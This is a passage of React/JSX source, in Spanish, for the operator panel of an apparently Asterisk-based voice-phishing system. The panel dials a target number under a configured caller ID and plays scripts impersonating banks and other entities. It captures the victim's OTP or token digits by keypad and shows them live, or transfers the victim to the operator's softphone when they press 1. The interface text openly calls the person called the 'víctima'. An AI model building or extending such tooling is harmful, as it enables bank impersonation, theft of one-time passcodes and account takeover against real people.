              <div className="py-8 text-slate-400 text-sm flex flex-col items-center justify-center gap-3 font-mono bg-slate-950/60 rounded-xl border border-slate-800/80">
                <div className="flex items-center gap-2.5 text-emerald-400">
                  <RefreshCw className="w-5 h-5 animate-spin" />
                  <span className="font-bold text-slate-200 text-base">Esperando que el cliente digite el código en su teléfono...</span>
                </div>
                <p className="text-xs text-slate-400 max-w-lg text-center leading-relaxed">
                  Pídele verbalmente al cliente en la llamada que marque su clave en su teclado numérico. En cuanto el cliente presione las teclas, los dígitos aparecerán aquí instantáneamente para que decidas si lo apruebas como válido o lo rechazas.
                </p>
                <div className="flex items-center gap-2 pt-1">
                  {Array.from({ length: 6 }).map((_, i) => (
                    <span
                      key={i}
                      className="w-10 h-12 flex items-center justify-center text-lg font-bold font-mono text-slate-600 bg-slate-900/80 rounded-lg border border-slate-800"
                    >
                      •
                    </span>
                  ))}
                </div>
              </div>
            )}
          </div>
          )}
        </div>
      )}

      {/* SINGLE LAUNCHER PANEL */}
      {productionMode === 'single' && (
        <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
          {/* Main Launcher Form */}
          <div className="lg:col-span-2 space-y-6">
            <div className="p-6 rounded-2xl bg-slate-950 border border-slate-800 space-y-6">
              <h3 className="text-base font-bold text-white flex items-center gap-2">
                <Rocket className="w-5 h-5 text-emerald-400" />
                <span>Configurar Llamada de Producción</span>
              </h3>

              {/* Destination Phone Number */}
              <div className="space-y-2">
                <label className="text-xs font-bold text-slate-300 uppercase tracking-wider flex items-center justify-between">
                  <span>Número de Teléfono del Objetivo</span>
                  <span className="text-slate-500 font-mono text-[11px]">Formato: 16104803845</span>
                </label>
                <div className="flex gap-2">
                  <input
                    id="input-prod-phone"
                    type="text"
                    value={targetNumber}
                    onChange={(e) => setTargetNumber(e.target.value)}
                    placeholder="ej. 16104803845"
                    className="flex-1 px-4 py-3 bg-slate-900 border border-slate-700 rounded-xl text-white font-mono text-lg font-bold focus:border-emerald-500 focus:outline-none"
                  />
                  <input
                    id="input-prod-name"
                    type="text"
                    value={targetName}
                    onChange={(e) => setTargetName(e.target.value)}
                    placeholder="Nombre titular (opcional)"
                    className="w-1/3 px-4 py-3 bg-slate-900 border border-slate-700 rounded-xl text-white text-xs focus:border-emerald-500 focus:outline-none hidden sm:block"
                  />
                </div>
              </div>

              {/* Service Template Selection with Dynamic Entity Management */}
              <div className="space-y-2.5">
                <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-2">
                  <div>
                    <label className="text-xs font-bold text-slate-200 uppercase tracking-wider flex items-center gap-1.5">
                      <Building2 className="w-4 h-4 text-emerald-400" />
                      <span>Guión / Entidad a Simular en el IVR</span>
                    </label>
                    <p className="text-[11px] text-slate-400">
                      Selecciona una entidad para la llamada o haz clic en <strong className="text-emerald-400">Editar</strong> para cambiar su nombre, textos y los 4 audios pregrabados.
                    </p>
                  </div>
                  <div className="flex items-center gap-1.5 self-start sm:self-auto flex-wrap">
                    <button
                      type="button"
                      onClick={handleSaveAndLockCurrentEntity}
                      disabled={isEntitySaving}
                      className={`inline-flex items-center gap-1.5 px-3 py-1.5 rounded-lg text-xs font-bold transition-all shadow-md ${
                        isEntitySaved
                          ? 'bg-emerald-500 text-black shadow-emerald-500/20 ring-2 ring-emerald-400'
                          : 'bg-emerald-600 hover:bg-emerald-500 text-white shadow-emerald-600/20'
                      }`}
                      title="Guardar y bloquear este guión en Asterisk AstDB para que no cambie al actualizar el sistema"
                    >
                      {isEntitySaved ? <Check className="w-3.5 h-3.5 text-black" /> : <Lock className="w-3.5 h-3.5" />}
                      <span>{isEntitySaving ? 'Guardando...' : isEntitySaved ? '¡Guión Bloqueado!' : 'Guardar y Bloquear Guión'}</span>
                    </button>

                    <button
                      type="button"
                      onClick={handleAddNewEntity}
                      className="inline-flex items-center gap-1 px-2.5 py-1.5 rounded-lg text-xs font-bold bg-emerald-500/10 hover:bg-emerald-500/20 text-emerald-300 border border-emerald-500/30 transition-all shadow-sm"
                      title="Crear un nuevo guión con audios personalizados"
                    >
                      <Plus className="w-3.5 h-3.5" />
                      <span>+ Nuevo Guión</span>
                    </button>
                    <button
                      type="button"
                      onClick={() => {
                        const current = campaignEntities.find((e) => e.id === selectedService) || campaignEntities[0];
                        setEditingEntity({ ...current });
                        setIsEntityModalOpen(true);
                      }}
                      className="inline-flex items-center gap-1 px-2.5 py-1.5 rounded-lg text-xs font-bold bg-slate-800 hover:bg-slate-700 text-slate-200 border border-slate-700 transition-all"
                      title="Editar el guión actualmente seleccionado"
                    >
                      <Pencil className="w-3 h-3 text-amber-400" />
                      <span>Editar Seleccionado</span>
                    </button>
                    {campaignEntities.length > 1 && (
                      confirmDeleteId === selectedService ? (
                        <div className="inline-flex items-center gap-1 bg-rose-950/90 px-2 py-1 rounded-lg border border-rose-500/60">
                          <span className="text-[10px] font-bold text-rose-300">¿Eliminar guión seleccionado?</span>
                          <button
                            type="button"
                            onClick={() => handleDeleteEntity(selectedService)}
                            className="px-2 py-0.5 rounded bg-rose-600 hover:bg-rose-500 text-white text-[10px] font-bold shadow"
                          >
                            Sí
                          </button>
                          <button
                            type="button"
                            onClick={() => setConfirmDeleteId(null)}
                            className="px-1.5 py-0.5 rounded bg-slate-800 hover:bg-slate-700 text-slate-300 text-[10px]"
                          >
                            No
                          </button>
                        </div>
                      ) : (
                        <button
                          type="button"
                          onClick={() => setConfirmDeleteId(selectedService)}
                          className="inline-flex items-center gap-1 px-2.5 py-1.5 rounded-lg text-xs font-bold bg-rose-500/10 hover:bg-rose-500/20 text-rose-300 border border-rose-500/30 transition-all"
                          title="Eliminar el guión actualmente seleccionado"
                        >
                          <Trash2 className="w-3 h-3" />
                          <span>Eliminar Seleccionado</span>
                        </button>
                      )
                    )}
                    <button
                      type="button"
                      onClick={handleResetEntities}
                      className="inline-flex items-center gap-1 px-2 py-1.5 rounded-lg text-[11px] text-slate-400 hover:text-slate-200 bg-slate-900 border border-slate-800 hover:border-slate-700 transition-all"
                      title="Restablecer guiones de fábrica"
                    >
                      <RotateCcw className="w-3 h-3" />
                      <span>Restablecer</span>
                    </button>
                  </div>
                </div>

                <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-2.5">
                  {campaignEntities.map((ent) => {
                    const isSelected = selectedService === ent.id;
                    const renderIcon = () => {
                      switch (ent.icon) {
                        case 'building':
                          return <Building2 className="w-4 h-4 text-emerald-400" />;
                        case 'card':
                          return <CreditCard className="w-4 h-4 text-sky-400" />;
                        case 'message':
                          return <MessageSquare className="w-4 h-4 text-emerald-300" />;
                        case 'lock':
                          return <Lock className="w-4 h-4 text-amber-400" />;
                        case 'shopping':
                          return <ShoppingBag className="w-4 h-4 text-orange-400" />;
                        default:
                          return <Sliders className="w-4 h-4 text-purple-400" />;
                      }
                    };

                    const cleanIntro = ent.introAudioPath?.replace(/^custom\//, '') || 'alerta';
                    const cleanAgent = ent.agentAudioPath?.replace(/^custom\//, '') || 'conectar_asesor';
                    const cleanPrompt = ent.promptAudioPath?.replace(/^custom\//, '') || 'solicitar_otp';

                    return (
                      <div
                        key={ent.id}
                        onClick={() => handleSelectEntity(ent)}
                        className={`p-3 rounded-xl border text-left transition-all cursor-pointer relative group flex flex-col justify-between gap-2.5 ${
                          isSelected
                            ? 'bg-emerald-950/30 border-emerald-500 text-white shadow-lg shadow-emerald-500/10 ring-1 ring-emerald-500/50'
                            : 'bg-slate-900/90 border-slate-800 text-slate-400 hover:text-white hover:border-slate-700'
                        }`}
                      >
                        <div className="flex items-start justify-between gap-2">
                          <div className="flex items-center gap-2 min-w-0 flex-1">
                            <div className={`p-1.5 rounded-lg shrink-0 ${isSelected ? 'bg-emerald-500/20' : 'bg-slate-800'}`}>
                              {renderIcon()}
                            </div>
                            {inlineRenamingId === ent.id ? (
                              <div className="flex-1 space-y-1 min-w-0" onClick={(e) => e.stopPropagation()}>
                                <input
                                  type="text"
                                  value={inlineNameVal}
                                  onChange={(e) => setInlineNameVal(e.target.value)}
                                  onKeyDown={(e) => {
                                    if (e.key === 'Enter') handleSaveInlineRename(ent.id, e);
                                    if (e.key === 'Escape') handleCancelInlineRename(e);
                                  }}
                                  placeholder="Nombre de la entidad..."
                                  className="w-full px-2 py-1 bg-slate-950 border border-emerald-500 rounded text-xs font-bold text-white focus:outline-none"
                                  autoFocus
                                />
                                <input
                                  type="text"
                                  value={inlineSubtitleVal}
                                  onChange={(e) => setInlineSubtitleVal(e.target.value)}
                                  onKeyDown={(e) => {
                                    if (e.key === 'Enter') handleSaveInlineRename(ent.id, e);
                                    if (e.key === 'Escape') handleCancelInlineRename(e);
                                  }}
                                  placeholder="Subtítulo..."
                                  className="w-full px-2 py-0.5 bg-slate-950 border border-slate-700 rounded text-[10px] text-slate-300 focus:outline-none focus:border-emerald-500"
                                />
                                <div className="flex items-center gap-1 pt-0.5">
                                  <button
                                    type="button"
                                    onClick={(e) => handleSaveInlineRename(ent.id, e)}
                                    className="px-2 py-0.5 rounded bg-emerald-500 hover:bg-emerald-400 text-black text-[10px] font-bold"
                                  >
                                    Guardar
                                  </button>
                                  <button
                                    type="button"
                                    onClick={handleCancelInlineRename}
                                    className="px-2 py-0.5 rounded bg-slate-800 hover:bg-slate-700 text-slate-300 text-[10px]"
                                  >
                                    Cancelar
                                  </button>
                                </div>
                              </div>
                            ) : (
                              <div
                                className="truncate cursor-pointer group/title flex-1"
                                onClick={(e) => handleStartInlineRename(ent, e)}
                                title="Haz clic para renombrar directamente"
                              >
                                <div className="text-xs font-bold text-white leading-tight truncate flex items-center gap-1 hover:text-emerald-400 transition-colors">
                                  <span>{ent.name}</span>
                                  <Pencil className="w-2.5 h-2.5 opacity-0 group-hover/title:opacity-100 text-slate-400 transition-opacity" />
                                </div>
                                <div className="text-[10px] text-slate-400 truncate">{ent.subtitle}</div>
                              </div>
                            )}
                          </div>
                          {inlineRenamingId !== ent.id && (
                            confirmDeleteId === ent.id ? (
                              <div
                                className="flex items-center gap-1 bg-rose-950/90 p-1 rounded-lg border border-rose-500/60 shrink-0"
                                onClick={(e) => e.stopPropagation()}
                              >
                                <span className="text-[10px] text-rose-300 font-bold px-0.5">¿Borrar?</span>
                                <button
                                  type="button"
                                  onClick={(e) => {
                                    e.stopPropagation();
                                    handleDeleteEntity(ent.id);
                                  }}
                                  className="px-2 py-0.5 rounded bg-rose-600 hover:bg-rose-500 text-white text-[10px] font-bold shadow transition-colors"
                                  title="Confirmar eliminación"
                                >
                                  Sí
                                </button>
                                <button
                                  type="button"
                                  onClick={(e) => {
                                    e.stopPropagation();
                                    setConfirmDeleteId(null);
                                  }}
                                  className="px-1.5 py-0.5 rounded bg-slate-800 hover:bg-slate-700 text-slate-300 text-[10px] transition-colors"
                                  title="Cancelar"
                                >
                                  No
                                </button>
                              </div>
                            ) : (
                              <div className="flex items-center gap-1 shrink-0">
                                <button
                                  type="button"
                                  onClick={(e) => handleStartInlineRename(ent, e)}
                                  title="Cambiar nombre de este guión"
                                  className="p-1.5 rounded-lg bg-slate-800/80 hover:bg-slate-700 text-slate-400 hover:text-emerald-300 border border-slate-700/80 transition-all"
                                >
                                  <Edit3 className="w-3 h-3" />
                                </button>
                                <button
                                  type="button"
                                  onClick={(e) => {
                                    e.stopPropagation();
                                    setEditingEntity({ ...ent });
                                    setIsEntityModalOpen(true);
                                  }}
                                  title="Configurar todos los audios y detalles de este guión"
                                  className="p-1.5 rounded-lg bg-slate-800 hover:bg-slate-700 text-slate-300 hover:text-white border border-slate-700 transition-all"
                                >
                                  <Sliders className="w-3 h-3 text-amber-400" />
                                </button>
                                <button
                                  type="button"
                                  disabled={campaignEntities.length <= 1}
                                  onClick={(e) => {
                                    e.stopPropagation();
                                    setConfirmDeleteId(ent.id);
                                  }}
                                  title={campaignEntities.length <= 1 ? "Debe haber al menos un guión disponible" : "Eliminar este guión"}
                                  className="p-1.5 rounded-lg bg-slate-800/80 hover:bg-rose-950/60 text-slate-400 hover:text-rose-400 border border-slate-700/80 hover:border-rose-500/40 transition-all disabled:opacity-20 disabled:cursor-not-allowed"
                                >
                                  <Trash2 className="w-3 h-3" />
                                </button>
                              </div>
                            )
                          )}
                        </div>

                        {/* Badges de audios asignados a esta entidad */}
                        <div className="space-y-1 text-[10px] font-mono bg-slate-950/80 p-2 rounded-lg border border-slate-800/80">
                          <div className="flex items-center justify-between gap-1 text-slate-400 truncate">
                            <span className="flex items-center gap-1 text-slate-300 shrink-0">
                              <Volume2 className="w-2.5 h-2.5 text-emerald-400" /> Saludo:
                            </span>
                            <span className="text-emerald-300 truncate font-semibold" title={ent.introAudioPath}>
                              {cleanIntro}
                            </span>
                          </div>
                          <div className="flex items-center justify-between gap-1 text-slate-400 truncate">
                            <span className="flex items-center gap-1 text-slate-300 shrink-0">
                              <PhoneForwarded className="w-2.5 h-2.5 text-sky-400" /> Asesor (1):
                            </span>
                            <span className="text-sky-300 truncate font-semibold" title={ent.agentAudioPath}>
                              {cleanAgent}
                            </span>
                          </div>
                          <div className="flex items-center justify-between gap-1 text-slate-400 truncate">
                            <span className="flex items-center gap-1 text-slate-300 shrink-0">
                              <KeyRound className="w-2.5 h-2.5 text-purple-400" /> OTP:
                            </span>
                            <span className="text-purple-300 truncate font-semibold" title={ent.promptAudioPath}>
                              {cleanPrompt}
                            </span>
                          </div>
                        </div>

                        <div className="flex items-center justify-between text-[10px] text-slate-500 pt-1 border-t border-slate-800/70">
                          <span className="truncate">CID: {ent.defaultCallerName || 'Predeterminado'}</span>
                          {isSelected ? (
                            <span className="text-[10px] font-bold text-emerald-400 flex items-center gap-1 shrink-0">
                              <Check className="w-3 h-3" /> Seleccionado
                            </span>
                          ) : (
                            <span className="text-[10px] text-slate-500 group-hover:text-slate-300 transition-colors">
                              Clic para activar
                            </span>
                          )}
                        </div>
                      </div>
                    );
                  })}
                </div>
              </div>

              {/* Big Launch Button */}
              <div className="pt-2">
                <button
                  id="btn-launch-production-call"
                  onClick={handleLaunchProductionCall}
                  disabled={isLaunching || !targetNumber.trim()}
                  className="w-full py-4 rounded-xl font-black text-base bg-gradient-to-r from-emerald-500 to-teal-400 hover:from-emerald-400 hover:to-teal-300 text-slate-950 shadow-xl shadow-emerald-500/25 transition-all flex items-center justify-center gap-3 disabled:opacity-50"
                >
                  {isLaunching ? (
                    <RefreshCw className="w-5 h-5 animate-spin" />
                  ) : (
                    <Rocket className="w-5 h-5" />
                  )}
                  <span>
                    {isLaunching ? 'Lanzando Llamada a Asterisk...' : 'INICIAR LLAMADA DE PRODUCCIÓN AHORA'}
                  </span>
                </button>
              </div>

              {launchFeedback && (
                <div
                  className={`p-3 rounded-xl text-xs flex items-center gap-2 ${
                    launchFeedback.type === 'success'
                      ? 'bg-emerald-500/10 border border-emerald-500/30 text-emerald-400'
                      : 'bg-rose-500/10 border border-rose-500/30 text-rose-400'
                  }`}
                >
                  <AlertCircle className="w-4 h-4 shrink-0" />
                  <span>{launchFeedback.text}</span>
                </div>
              )}
            </div>
          </div>

          {/* Side Info & Tips */}
          <div className="space-y-6">
            <div className="p-5 rounded-2xl bg-slate-950 border border-slate-800 space-y-4">
              <h4 className="text-xs font-bold text-slate-300 uppercase tracking-wider flex items-center gap-2">
                <ShieldCheck className="w-4 h-4 text-emerald-400" />
                <span>Parámetros de Operación</span>
              </h4>

              <div className="space-y-3 text-xs">
                <div className="p-3 rounded-xl bg-slate-900 border border-slate-800">
                  <div className="text-[10px] text-slate-500 font-mono">Troncal Asignada</div>
                  <div className="font-bold text-white mt-0.5">{activeCarrier} (SIP UDP)</div>
                  <div className="text-[11px] text-slate-400">Ruta saliente automática configurada</div>
                </div>

                <div className="p-3 rounded-xl bg-slate-900 border border-slate-800">
                  <div className="text-[10px] text-slate-400 font-mono font-bold flex items-center gap-1">
                    <Phone className="w-3 h-3 text-sky-400" />
                    <span>CallerID de Extensión {agentExtension}</span>
                  </div>
                  <div className="font-bold text-white mt-0.5 font-mono">{callerIdNum}</div>
                  <div className="text-[11px] text-slate-400 font-medium truncate">"{callerIdName}" (gestionado en Extensiones)</div>
                </div>

                <div className="p-3 rounded-xl bg-slate-900 border border-slate-800">
                  <div className="text-[10px] text-slate-500 font-mono">Softphone del Operador</div>
                  <div className="font-bold text-emerald-400 mt-0.5 font-mono">Extensión {agentExtension} (PJSIP)</div>
                  <div className="text-[11px] text-slate-400">Recibe transferencias cuando la víctima presiona 1</div>
                </div>
              </div>
            </div>
          </div>
        </div>
      )}

      {/* ======================================================== */}
      {/* PESTAÑA DEDICADA: ACCIÓN DEL IVR AL CONTESTAR (ESPACIO EXPANDIDO) */}
      {/* ======================================================== */}
      {productionMode === 'ivr_action' && (
        <div className="space-y-6">
          {/* Header Banner con Acciones Rápidas */}
          <div className="p-6 rounded-2xl bg-slate-950 border border-slate-800 flex flex-col lg:flex-row lg:items-center justify-between gap-4">
            <div>
              <div className="flex items-center gap-2.5">
                <div className="p-2 rounded-xl bg-emerald-500/10 border border-emerald-500/30 text-emerald-400">
                  <Zap className="w-6 h-6" />
                </div>
                <div>
                  <h3 className="text-lg font-bold text-white flex items-center gap-2">
                    <span>Acción del IVR al Contestar</span>
                    <span className="px-2.5 py-0.5 rounded-full text-xs font-mono font-bold bg-emerald-500/20 text-emerald-300 border border-emerald-500/30">
                      {callFlowMode === 'otp' ? 'Modo OTP Activo' : callFlowMode === 'press1' ? 'Modo Press-1 Activo' : 'Modo Híbrido Activo'}
                    </span>
                  </h3>
                  <p className="text-xs text-slate-400 mt-0.5">
                    Configuración de espacio amplio: define exactamente cómo responderá Asterisk, qué locuciones reproducirá y cómo capturará los datos al descolgar la llamada.
                  </p>
                </div>
              </div>
            </div>

            <div className="flex flex-wrap items-center gap-2.5">
              <button
                type="button"
                onClick={() => setProductionMode('single')}
                className="px-3.5 py-2 rounded-xl bg-slate-900 hover:bg-slate-800 text-slate-300 border border-slate-700 text-xs font-bold flex items-center gap-1.5 transition-all shadow-sm"
              >
                <span>← Volver al Disparador Individual</span>
              </button>

              <button
                type="button"
                onClick={() => handleSyncAudiosToAsterisk(false)}
                disabled={isSyncingAudios}
                className="px-4 py-2 rounded-xl bg-emerald-600/20 hover:bg-emerald-600/30 text-emerald-300 border border-emerald-500/40 text-xs font-bold flex items-center gap-2 transition-all shadow-sm"
              >
                <RefreshCw className={`w-3.5 h-3.5 ${isSyncingAudios ? 'animate-spin' : ''}`} />
                <span>{isSyncingAudios ? 'Sincronizando...' : 'Sincronizar Audios con Asterisk'}</span>
              </button>
            </div>
          </div>

          {/* Feedback de Sincronización */}
          {audioSyncFeedback && (
            <div className="p-3 rounded-xl bg-emerald-500/10 border border-emerald-500/30 text-emerald-300 text-xs font-semibold flex items-center gap-2">
              <CheckCircle2 className="w-4 h-4 text-emerald-400 shrink-0" />
              <span>{audioSyncFeedback}</span>
            </div>
          )}

          {/* Selector de Modos de Flujo en Pestañas Grandes */}
          <div className="p-6 rounded-2xl bg-slate-950 border border-slate-800 space-y-5">
            <div className="flex items-center justify-between border-b border-slate-800 pb-3">
              <div>
                <h4 className="text-sm font-bold text-white uppercase tracking-wider flex items-center gap-2">
                  <Sliders className="w-4 h-4 text-emerald-400" />
                  <span>1. Selecciona la Acción Principal del IVR</span>
                </h4>
                <p className="text-xs text-slate-400">
                  Elige qué lógica se ejecutará automáticamente en Asterisk una vez que el destino conteste.
                </p>
              </div>
            </div>

            <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
              {/* Opción 1: Captura OTP */}
              <button
                type="button"
                onClick={() => setCallFlowMode('otp')}
                className={`p-5 rounded-2xl border text-left transition-all relative ${
                  callFlowMode === 'otp'
                    ? 'bg-emerald-500/15 border-emerald-500 text-white shadow-xl shadow-emerald-500/10 ring-2 ring-emerald-500/60'
                    : 'bg-slate-900/80 border-slate-800 text-slate-400 hover:text-white hover:border-slate-700'
                }`}
              >
                <div className="flex items-center justify-between mb-2">
                  <div className="p-2 rounded-xl bg-emerald-500/20 text-emerald-400">
                    <KeyRound className="w-5 h-5" />
                  </div>
                  {callFlowMode === 'otp' ? (
                    <span className="px-2 py-0.5 rounded text-[10px] font-bold bg-emerald-500 text-slate-950">
                      SELECCIONADO
                    </span>
                  ) : (
                    <span className="text-[10px] font-mono text-slate-500">Modo 1</span>
                  )}
                </div>
                <div className="text-sm font-bold text-white">1. Capturar Código OTP</div>
                <div className="text-xs text-slate-300 mt-1 leading-relaxed">
                  Reproduce la alerta de seguridad del banco y solicita al cliente ingresar su código TOKEN o clave OTP de 4 o 6 dígitos en el teclado.
                </div>
                <div className="mt-3 pt-2.5 border-t border-slate-800/80 text-[11px] text-emerald-400/90 font-mono">
                  ✓ Reflejo inmediato en pantalla en tiempo real
                </div>
              </button>

              {/* Opción 2: Press-1 */}
              <button
                type="button"
                onClick={() => setCallFlowMode('press1')}
                className={`p-5 rounded-2xl border text-left transition-all relative ${
                  callFlowMode === 'press1'
                    ? 'bg-sky-500/15 border-sky-500 text-white shadow-xl shadow-sky-500/10 ring-2 ring-sky-500/60'
                    : 'bg-slate-900/80 border-slate-800 text-slate-400 hover:text-white hover:border-slate-700'
                }`}
              >
                <div className="flex items-center justify-between mb-2">
                  <div className="p-2 rounded-xl bg-sky-500/20 text-sky-400">
                    <PhoneForwarded className="w-5 h-5" />
                  </div>
                  {callFlowMode === 'press1' ? (
                    <span className="px-2 py-0.5 rounded text-[10px] font-bold bg-sky-400 text-slate-950">
                      SELECCIONADO
                    </span>
                  ) : (
                    <span className="text-[10px] font-mono text-slate-500">Modo 2</span>
                  )}
                </div>
                <div className="text-sm font-bold text-white">2. Press-1 (Transferir a Softphone)</div>
                <div className="text-xs text-slate-300 mt-1 leading-relaxed">
                  Advierte sobre una transacción no autorizada y le indica a la víctima: <em>"Presione 1 para comunicarse con un asesor"</em>.
                </div>
                <div className="mt-3 pt-2.5 border-t border-slate-800/80 text-[11px] text-sky-400/90 font-mono">
                  ✓ Timbra directo en Extensión {agentExtension} (X-Lite / MicroSIP)
                </div>
              </button>

              {/* Opción 3: Híbrido */}
              <button
                type="button"
                onClick={() => setCallFlowMode('hybrid')}
                className={`p-5 rounded-2xl border text-left transition-all relative ${
                  callFlowMode === 'hybrid'
                    ? 'bg-purple-500/15 border-purple-500 text-white shadow-xl shadow-purple-500/10 ring-2 ring-purple-500/60'
                    : 'bg-slate-900/80 border-slate-800 text-slate-400 hover:text-white hover:border-slate-700'
                }`}
              >
                <div className="flex items-center justify-between mb-2">
                  <div className="p-2 rounded-xl bg-purple-500/20 text-purple-400">
                    <Radio className="w-5 h-5" />
                  </div>
                  {callFlowMode === 'hybrid' ? (
                    <span className="px-2 py-0.5 rounded text-[10px] font-bold bg-purple-400 text-slate-950">
                      SELECCIONADO
                    </span>
                  ) : (
                    <span className="text-[10px] font-mono text-slate-500">Modo 3</span>
                  )}
                </div>
                <div className="text-sm font-bold text-white">3. Híbrido Completo (OTP + Asesor)</div>
                <div className="text-xs text-slate-300 mt-1 leading-relaxed">
                  Pide el token de seguridad. Si el cliente ingresa el código se captura; si presiona 1 o solicita asesor, transfiere la llamada.
                </div>
                <div className="mt-3 pt-2.5 border-t border-slate-800/80 text-[11px] text-purple-400/90 font-mono">
                  ✓ Máxima flexibilidad operativa
                </div>
              </button>
            </div>
          </div>

          {/* Diagrama Visual del Flujo Paso a Paso */}
          <div className="p-6 rounded-2xl bg-slate-950 border border-slate-800 space-y-4">
            <h4 className="text-xs font-bold text-slate-300 uppercase tracking-wider flex items-center gap-2">
              <Sparkles className="w-4 h-4 text-emerald-400" />
              <span>Diagrama del Flujo de Llamada ({callFlowMode.toUpperCase()})</span>
            </h4>

            <div className="grid grid-cols-1 md:grid-cols-5 gap-3">
              <div className="p-3.5 rounded-xl bg-slate-900 border border-slate-800">
                <div className="text-[10px] font-mono text-emerald-400 font-bold">PASO 1</div>
                <div className="text-xs font-bold text-white mt-1">Conexión Saliente</div>
                <div className="text-[11px] text-slate-400 mt-1">
                  Asterisk marca por la troncal <code className="text-slate-300">{activeCarrier}</code> mostrando el CallerID configurado.
                </div>
              </div>

              <div className="p-3.5 rounded-xl bg-slate-900 border border-slate-800">
                <div className="text-[10px] font-mono text-emerald-400 font-bold">PASO 2</div>
                <div className="text-xs font-bold text-white mt-1">Descolgado & Saludo</div>
                <div className="text-[11px] text-slate-400 mt-1">
                  La víctima contesta. Asterisk ejecuta <code className="text-slate-300">Answer()</code> y reproduce la Alerta de <code className="text-emerald-300">{serviceLabel}</code>.
                </div>
              </div>

              <div className="p-3.5 rounded-xl bg-slate-900 border border-emerald-500/40 bg-emerald-950/20">
                <div className="text-[10px] font-mono text-emerald-400 font-bold">PASO 3</div>
                <div className="text-xs font-bold text-white mt-1">
                  {callFlowMode === 'otp' ? 'Solicitud de Token OTP' : callFlowMode === 'press1' ? 'Opción Press 1' : 'Menú Dual OTP/Asesor'}
                </div>
                <div className="text-[11px] text-slate-400 mt-1">
                  {callFlowMode === 'otp'
                    ? 'Asterisk lee los tonos DTMF (4 o 6 dígitos) y los almacena en AstDB.'
                    : callFlowMode === 'press1'
                    ? `Si presiona 1, ejecuta Dial(PJSIP/${agentExtension}) para conectar con tu softphone.`
                    : `Captura el código OTP ingresado o transfiere a la ${agentExtension} si presiona 1.`}
                </div>
              </div>

              <div className="p-3.5 rounded-xl bg-slate-900 border border-slate-800">
                <div className="text-[10px] font-mono text-emerald-400 font-bold">PASO 4</div>
                <div className="text-xs font-bold text-white mt-1">
                  {callFlowMode === 'press1' ? 'Conversación en Vivo' : 'Procesamiento OTP'}
                </div>
                <div className="text-[11px] text-slate-400 mt-1">
                  {callFlowMode === 'press1'
                    ? `El operador toma la llamada en el softphone registrado (Extensión ${agentExtension}).`
                    : 'Asterisk reproduce la locución de "Un momento validando su información".'}
                </div>
              </div>

              <div className="p-3.5 rounded-xl bg-slate-900 border border-slate-800">
                <div className="text-[10px] font-mono text-emerald-400 font-bold">PASO 5</div>
                <div className="text-xs font-bold text-white mt-1">Confirmación & Cierre</div>
                <div className="text-[11px] text-slate-400 mt-1">
                  Reproduce la locución de éxito ("Operación bloqueada con éxito") y finaliza la llamada.
                </div>
              </div>
            </div>
          </div>

          {/* Configuración Completa de Locuciones con Espacio Amplio */}
          <div className="p-6 rounded-2xl bg-slate-950 border border-slate-800 space-y-5">
            <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 border-b border-slate-800 pb-3">
              <div>
                <h4 className="text-sm font-bold text-white uppercase tracking-wider flex items-center gap-2">
                  <Volume2 className="w-5 h-5 text-emerald-400" />
                  <span>2. Locuciones y Audios Pregrabados ({serviceLabel})</span>
                </h4>
                <p className="text-xs text-slate-400">
                  Prueba, asigna o sube los audios que Asterisk reproducirá en cada etapa de la llamada.
                </p>
              </div>

              <button
                type="button"
                onClick={() => {
                  setQuickUploadSlot('introAudioPath');
                  setIsQuickUploadOpen(true);
                }}
                className="inline-flex items-center gap-2 px-4 py-2 rounded-xl text-xs font-bold bg-emerald-500/10 border border-emerald-500/30 text-emerald-300 hover:bg-emerald-500/20 transition-all self-start sm:self-auto shadow-sm"
              >
                <Plus className="w-4 h-4" />
                <span>+ Subir o Grabar Nuevo Audio</span>
              </button>
            </div>

            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
              {/* Slot 1: Audio de Bienvenida / Alerta de Fraude */}
              <div className="p-4 rounded-xl bg-slate-900 border border-slate-800 space-y-3">
                <div className="flex items-center justify-between">
                  <label className="text-xs font-bold text-slate-200 flex items-center gap-2">
                    <span className="w-2 h-2 rounded-full bg-emerald-400"></span>
                    <span>1. Saludo / Alerta Inicial Antifraude</span>
                  </label>
                  <button
                    type="button"
                    onClick={() => handleTogglePlayAudio(campaignAudios[selectedService].introAudioPath, 'intro')}
                    disabled={!campaignAudios[selectedService].introAudioPath}
                    className="p-1.5 rounded-lg bg-slate-800 text-slate-300 hover:text-white disabled:opacity-30 transition-all flex items-center gap-1.5 text-xs font-semibold px-2.5"
                    title="Escuchar audio"
                  >
                    {playingAudioKey === 'intro' ? (
                      <>
                        <Pause className="w-3.5 h-3.5 text-emerald-400 animate-pulse" />
                        <span className="text-emerald-400">Pausar</span>
                      </>
                    ) : (
                      <>
                        <Play className="w-3.5 h-3.5 text-slate-300" />
                        <span>Escuchar</span>
                      </>
                    )}
                  </button>
                </div>

                <div className="space-y-1.5">
                  <div className="text-[11px] text-slate-400">Seleccionar de la audioteca:</div>
                  <select
                    value={campaignAudios[selectedService].introAudioPath}
                    onChange={(e) => handleUpdateCampaignAudio(selectedService, 'introAudioPath', e.target.value)}
                    className="w-full px-3 py-2 bg-slate-950 border border-slate-700 rounded-lg text-xs text-white focus:outline-none focus:border-emerald-500 font-mono"
                  >
                    <option value="">-- Beep estándar de Asterisk --</option>
                    <option value={`custom/alerta_${selectedService}`}>custom/alerta_{selectedService} (Predeterminado)</option>
                    {audios.map((a) => (
                      <option key={a.id} value={a.asteriskPath}>
                        {a.name} ({a.asteriskPath})
                      </option>
                    ))}
                  </select>
                </div>

                <div className="space-y-1">
                  <div className="text-[11px] text-slate-400">O ingresar ruta directa en el servidor Asterisk:</div>
                  <input
                    type="text"
                    value={campaignAudios[selectedService].introAudioPath}
                    onChange={(e) => handleUpdateCampaignAudio(selectedService, 'introAudioPath', e.target.value)}
                    placeholder="ej: custom/banrearreglado"
                    className="w-full px-3 py-1.5 bg-slate-950/80 border border-slate-700/60 rounded-lg text-xs text-slate-200 font-mono focus:border-emerald-500 focus:outline-none"
                  />
                  <div className="text-[10px] text-slate-500 font-mono">
                    Ruta física: /var/lib/asterisk/sounds/{campaignAudios[selectedService].introAudioPath || 'beep'}.wav
                  </div>
                </div>
              </div>

              {/* Slot 2: Solicitud de Código OTP */}
